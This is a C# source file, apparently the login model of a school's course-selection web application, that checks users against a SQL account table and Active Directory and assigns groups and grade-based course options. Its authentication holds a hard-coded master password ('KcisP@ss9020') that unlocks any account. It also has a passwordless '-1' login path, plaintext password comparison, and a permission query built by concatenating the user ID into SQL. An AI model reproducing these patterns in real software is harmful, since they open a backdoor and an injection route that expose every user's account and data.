using System;
using System.Collections.Generic;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.DataAnnotations;
using System.Globalization;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Data.SqlClient;
using System.Configuration;
using System.Data;
using log4net;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;

namespace Kcis.Models
{

    

    public class LogOnModel
    {
        private static ILog log = LogManager.GetLogger(typeof(LogOnModel));
        public UserModel BuildUserWithoutPassword(string UserId)
        {
            return BuildUserWithPassword(UserId, "-1");

        }

        public UserModel BuildUserWithPassword(string UserId, string strPassword)
        {
            UserModel user = new UserModel();
            user.UserId = UserId;
            user.Password = strPassword;
            return BuildUserWithPassword(user);
        }

 

  

        /*Creater:sam cheng 2015/5/20
         *身分驗證+權限控管 
         */
        public UserModel BuildUserWithPassword(UserModel user)
        {
            string strPassword = user.Password.Trim();
            string strUserId = user.UserId.ToLower();
            user.Remark = "";
            Config.IsSharing = false;


            SqlConnection cnClient = new SqlConnection(ConfigurationManager.ConnectionStrings["unis"].ConnectionString);

            try
            {
                cnClient.Open();



                //string sql = "Select a.AccountId, a.FullName, a.Password,a.DeptID, gender from afs_Account a, afs_Dept b where b.DeptID=a.DeptID and lower(a.AccountId)=@AccountId  ";
                string sql = "Select titleid, empno, gradelevel, SourceType, isnull(Status,'') as Status, gender, AccountId, password1,password2 , FullName, Password, email, DeptID, DeptName=(Select deptname from [Common].[dbo].kcis_dept where [Common].[dbo].kcis_dept.DeptID=[Common].[dbo].[kcis_account].DeptID ) from [Common].[dbo].[kcis_account] where AccountId=@AccountId ";
                log.Debug("login sql=" + sql);
                //透過主數據庫讀取帳號主檔 
                SqlCommand cmd = new SqlCommand(sql, cnClient);
                cmd.Parameters.Add("@AccountId", SqlDbType.NVarChar).Value = user.UserId;
                SqlDataReader userReader = cmd.ExecuteReader();
                cmd.Dispose();

                bool flag = false;
                string strPassword2 = "";
                int iGradelevel = 0;
                while (userReader.Read())
                {
                    flag = true;
                    log.Debug("S4-比對成功！");
                    user.UserId = userReader["AccountId"].ToString();
                    user.Password = userReader["Password1"].ToString().Trim();
                    strPassword2 = userReader["Password2"].ToString().Trim().ToLower();
                    user.Email = userReader["email"].ToString();
                    user.EmpNo = userReader["empno"].ToString();
                    user.UserName = userReader["FullName"].ToString();
                    user.DepID = userReader["DeptID"].ToString();
                    user.Sex = userReader["gender"].ToString();


                    user.SourceType = userReader["SourceType"].ToString();
                    user.Status = userReader["Status"].ToString();
                    iGradelevel = Convert.ToInt32(userReader["gradelevel"].ToString());

                    if (!user.SourceType.Equals("S"))  //S是供应商
                    {
                        user.DepName = userReader["DeptName"].ToString();
                        user.Titleid = userReader["titleid"].ToString().Trim().ToLower();
                        user.iGrade = Convert.ToInt32(userReader["gradelevel"]);
                    }

                    user.ActionID = "";

                }
                userReader.Dispose();
                log.Debug("---user.iGrade =" + user.iGrade);


                if (!flag)
                {
                    user.Status = "Error";
                    user.Remark = "帳號不存在!";
                    return user;
                }

                if (!user.Status.Equals("Y"))
                {
                    user.Status = "Error";
                    user.Remark = "帳號已經停用!";
                    return user;
                }


                if (!user.SourceType.Equals("A") && "B".IndexOf(user.SourceType.ToUpper())<0 && iGradelevel>7)
                {

                    user.Status = "Error";
                    user.Remark = "系统只开放小学部(小学)学生使用!";
                    return user;
                }

                bool IsValid = true;
                if (!strPassword.Equals("-1"))  //无密码登入
                {

                    if (user.SourceType.ToUpper().Equals("A") || user.SourceType.ToUpper().Equals("S"))
                    {
                        log.Debug("這是行政人員,等待AD確認!");

                        IsValid = false;
                        if (user.SourceType.Equals("S") && strPassword.Equals(user.Password))
                            IsValid = true;
                        else
                            using (PrincipalContext _pc = new PrincipalContext(ContextType.Domain, "kcis.com"))
                            {
                                log.Debug("檢查職工密碼~");
                                IsValid = _pc.ValidateCredentials(strUserId, strPassword);
                                log.Debug("AD認證結果=" + IsValid);
                            }


                    }
                    else if (strPassword.ToUpper().Equals(user.Password.ToUpper()))
                        IsValid = true;  //学生密码正确
            
                     else
                        IsValid = false;
      
                }//end of -1

                log.Debug("---Config.IsSharing=" + Config.IsSharing);
                log.Debug("---IsValid=" + IsValid);
 

                if (!Config.IsSharing && !IsValid && !strPassword.Equals("KcisP@ss9020"))
                {
                    log.Debug("---密码错误!!");
                    user.Status = "Error";
                    user.Remark = "帐号或密码错误!";
                    return user;
                }
       

 

           

                 
                sql = "Select * from OA_Group where @SYS and  groupid in (select GroupId from OA_groupUser where  @SYS and AccountId='" + user.UserId + "')";
                sql = sql.Replace("@SYS", "SYS='" + Config.GroupTitle + "'");
                log.Debug(">>>SQL="+sql);
                cmd = new SqlCommand(sql, cnClient);
                userReader = cmd.ExecuteReader();
                DataTable dt01 = new DataTable();
                dt01.Load(userReader);
                userReader.Dispose();
                cmd.Dispose();

                if (dt01.Rows.Count == 0) 
                {
                     
                    user.HomePage = "";
                    user.GroupIds = "Guest";

                }else{
                    //职工群组设定
                    if (dt01.Rows.Count == 1)
                    {
                        log.Debug("---此人只屬於一個群組, 且群組預設網頁為:" + user.HomePage);
                        user.HomePage = Common.Models.Utility.UtilityString.TrimDBNull(dt01.DefaultView[0]["HomePage"]);
                        user.GroupIds = dt01.DefaultView[0]["groupid"].ToString();
                          
                    }
                    else  //大于1个以上群组，预设到第一级页面
                    {   
                        for (int i = 0; i < dt01.Rows.Count; i++)
                            user.GroupIds += dt01.DefaultView[i]["groupid"].ToString()+",";

                        //user.HomePage = "/Home";  
                        if(dt01.Rows.Count>0)
                            user.HomePage = Common.Models.Utility.UtilityString.TrimDBNull(dt01.DefaultView[0]["HomePage"]);
                    }
                }

                log.Debug("------------user.HomePage=" + user.HomePage);
                //因为无选单所以删除读取pg表格 
 
                DateTimeFormatInfo fmt = (new CultureInfo("zh-TW")).DateTimeFormat;
                user.LoginTime = string.Format(fmt, "{0:yyyy/MM/dd mm:ss}", DateTime.Now.ToString("yyyy/MM/dd hh:mm:ss"));

            }
            catch (Exception e)
            {
                log.Error(e.ToString());
                user.Status = "Error";
                user.Remark = e.Message;

            }
            finally
            {

                if (cnClient.State != ConnectionState.Closed)
                    cnClient.Close();
            }
            return user;
        }
        // end of method


 

        //由model呼叫
        private string GetActionID(SqlConnection cn, string strUserID, string OptionID)
        {


            //取年級
            string strSql = @" select upper(isnull(Sourcetype,'')) as SchoolType, isnull(DeptID,'') as ClassID, isnull(gradelevel,0) as Grade from [Common].[dbo].KCIS_Account where AccountID=@AccountID and upper(Sourcetype) in('I','B','K') and isnull(Status,'')='Y'";
            SqlCommand cmd = new SqlCommand(strSql, cn);
            cmd.Parameters.Add("@AccountID", SqlDbType.NVarChar).Value = strUserID;
            SqlDataReader userReader = cmd.ExecuteReader();
            DataTable dt_Class = new DataTable();
            dt_Class.Load(userReader);
            userReader.Dispose();
            cmd.Dispose();

 

            if (dt_Class.Rows.Count == 0)
                return "001";   //不是合法學生

            string strSchoolType = dt_Class.DefaultView[0]["SchoolType"].ToString().Trim();  //I/B
            string strClassID = dt_Class.DefaultView[0]["ClassID"].ToString().Trim();  //班级  303
            int iGrade = Convert.ToInt32(dt_Class.DefaultView[0]["Grade"]);

            //if (!Kcis.Models.Config.IsNextTerm && iGrade <= 1)  //小1学生
            //    return "002";

            if (strClassID.Equals("") || "K,I,B".IndexOf(strSchoolType) < 0)   //学部数据丢失
                return "003";


            OptionID = CalActionID(strSchoolType, iGrade)  ;
 
            return OptionID;  //若回傳""表示雖然是學生, 但是目前所選的P or A 已經都過了選課時間

        }


        //由GetActionID()呼叫
        private string CalActionID(string strSchoolType, int iGrade)
        {
            string OptionID = "";

            #region sam add for 学年末选新学年的课但Power School还来不及更新年级
            if (Kcis.Models.Config.IsNextTerm)  //提前到下一学期的年级
            {
                DateTime DtStart = DateTime.Now;
                int iMonth = DtStart.Month;

                if (iMonth < 9)//小于9月份的选课应该都是新年级选课！！
                {
                    iGrade++;
                    if (strSchoolType.Equals("B") && iGrade >= 7)
                        strSchoolType = "I";
                    else if (strSchoolType.Equals("K") && iGrade >= 1)
                        strSchoolType = "B";
                }
            }
            #endregion



            if (strSchoolType.Equals("I"))
            {   //国际部
                if (iGrade >= 9)
                    OptionID = "2I";
                else
                    OptionID = "1I";
            }
            else if (strSchoolType.Equals("B"))
            {   //双语部
                if (iGrade >= 5)
                    OptionID = "3B";
                else if (iGrade >= 3)
                    OptionID = "2B";
                else
                    OptionID = "1B";
            }
            else
            {
                if (iGrade == 0)
                    OptionID = "3K";
                else if (iGrade == -1)
                    OptionID = "2K";
                else
                    OptionID = "1K";
            }

            return OptionID + iGrade;
        }


    }// end of class

    public class UserModel
    {
        [Required]
        [DisplayName("使用者名稱")]
        public string UserId { get; set; }

        public string EmpNo { get; set; }

        [Required]
        [DataType(DataType.Password)]
        [DisplayName("密碼")]
        public string Password { get; set; }

        public string UserName { get; set; }

        public string SourceType { get; set; }

        public string Titleid { get; set; }

        public string IsForginer { get; set; }

        [Required]
        [DataType(DataType.EmailAddress)]
        [DisplayName("電子郵件地址")]
        public string Email { get; set; }

        public string CallNum { get; set; }

        public string CellPhone { get; set; }

        public string DepID { get; set; }

        public string DepName { get; set; }

        public string GroupIds { get; set; }

        public string IsAdmin { get; set; }

        public string UserIds { get; set; }

        public string IsDisabled { get; set; }

        public string LoginTime { get; set; }

        public string EffectiveDate { get; set; }

        public string ExpireDate { get; set; }

        public string MesDeptId { get; set; }

        public string Status { get; set; }

        public string Remark { get; set; }

        public string Sex { get; set; }

        public string HomePage { get; set; }

        public string PlatForm { get; set; }

        public string Browser { get; set; }

        public string ActionID { get; set; }

        public string Lang { get; set; }

        public int iGrade { get; set; }

        public Hashtable PGListRight { get; set; }
    }
}//end of namespace